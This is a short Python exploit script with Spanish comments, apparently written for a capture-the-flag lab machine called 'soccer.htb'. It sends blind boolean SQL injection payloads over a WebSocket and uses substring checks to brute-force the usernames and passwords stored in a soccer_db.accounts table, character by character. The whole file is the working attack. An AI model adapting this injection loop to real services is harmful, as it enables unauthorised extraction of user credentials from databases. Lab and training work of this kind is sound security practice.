#!/usr/bin/env python3

# Error: TypeError: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'
#		pip3 uninstall websocket && pip3 install websocket-client

###			WEBSOCKET			websocket				WEBSOCKET				websocket
import websocket
import signal
import sys
import time
import string
import json

from pwn import *
from termcolor import colored

def def_handler(sig, frame):
	print(colored(f"\n\n[!] Saliendo...\n", 'red'))
	sys.exit(1)

# Ctrl-C
signal.signal(signal.SIGINT, def_handler)


characters = string.ascii_letters + string.digits + "-_,:@;!"

ws = websocket.WebSocket()
ws.connect("ws://soc-player.soccer.htb:9091/")

def makeRequest():
	
	database = ""

	p1 = log.progress("SQLI")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	p2 = log.progress(" Tables Name [soccer_db]")

	for i in range(1, 500):
		for character in characters:
			payload = {
				"id":"1 or binary substr((select group_concat(username,':',password) from soccer_db.accounts),%d,1)='%s'" % (i, character)

					#				 binary   paraMayusculas y Minusculas...<3 <3 <3
			}

			ws.send(json.dumps(payload))
			data = ws.recv()

			if "Ticket Doesn't Exist" not in data:
				database += character
				p2.status(database)
				break

if __name__ == '__main__':
	makeRequest()
